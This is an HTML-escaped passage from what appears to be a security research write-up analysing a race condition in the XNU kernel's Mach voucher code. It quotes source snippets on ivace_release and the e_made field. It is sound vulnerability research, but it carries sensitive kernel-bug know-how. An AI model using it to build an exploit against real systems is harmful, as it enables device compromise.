class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;2) &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;(ivace-&amp;gt;ivace_made != made)&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;(0 == ivace-&amp;gt;ivace_refs)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;In this case another thread (or threads) has raced, revived this ivace and then deallocated all their references. Since this thread set &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;TRUE&lt;/span&gt;&lt;span&gt;&amp;nbsp;the racing thread, after decrementing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;back to zero encountered this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.26d470c1ed36965b7017da35a088eb61bd6b63c5\"&gt;&lt;/a&gt;&lt;a id=\"t.51\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;and returned early from &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_release&lt;/span&gt;&lt;span&gt;, despite having dropped &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;to zero, and it&amp;#39;s now this thread&amp;#39;s responsibility to continue freeing this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.695f8a6ea5856759df1540506f4e25734c86a633\"&gt;&lt;/a&gt;&lt;a id=\"t.52\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;You can see the location of the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;label in the earlier snippets; it captures a new value from &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;before calling out to the attr manager again to try to free the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If we don&amp;#39;t &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;goto redrive&lt;/span&gt;&lt;span&gt;&amp;nbsp;then this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has been revived and is still alive, therefore all that needs to be done is set &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;and return.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The conditions under which the other branch is taken is nicely documented in a comment. This is the case when &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is equal to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;made&lt;/span&gt;&lt;span&gt;, yet &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_release_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;didn&amp;#39;t return success (so the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;wasn&amp;#39;t freed.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5eb97c3d310b04e72ad54169750ec70dff549ca6\"&gt;&lt;/a&gt;&lt;a id=\"t.53\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* If the manager returned FAILURE, someone took a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* reference on the value but have not updated the ivace,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* release the lock and return since thread who got&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the new reference will update the ivace and will have&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* non-zero reference on the value.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;In this case, the code again just sets &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_releasing&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;and continues.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Put another way, this comment explaining is exactly what happens when the racing thread was exactly in the region marked &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c23\"&gt;WINDOW&lt;/span&gt;&lt;span&gt;&amp;nbsp;up above, which is after that thread had incremented &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the same &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;which this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a pointer to in its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;field, but before that thread had looked up this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;nbsp;and taken a reference. That&amp;#39;s exactly the window another thread needs to hit where it&amp;#39;s not correct for this thread to free its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;, despite our &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;being 0.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.9t2rft5xjjjf\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;The bug&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Hopefully the significance of the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;field is now clear. It&amp;#39;s not exactly a reference count; in fact it only exists as a kind of band-aid to work around what should be in practice a very rare race condition. But, if its value was wrong, bad things could happen if you tried :)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is only modified in two places: Firstly, in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;when a matching &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;is found in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;hash table:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.484d8847b8af9875d2025d95cd2485b68892c7b1\"&gt;&lt;/a&gt;&lt;a id=\"t.54\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;e_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The only other place is in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;when handling the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;command during recipe parsing:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3c0876f1c62007cdc6321660fe4a6fcf553a111c\"&gt;&lt;/a&gt;&lt;a id=\"t.55\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;switch&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;case&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* redeem of previous values is the value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;prev_value_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_element_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;prev_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span 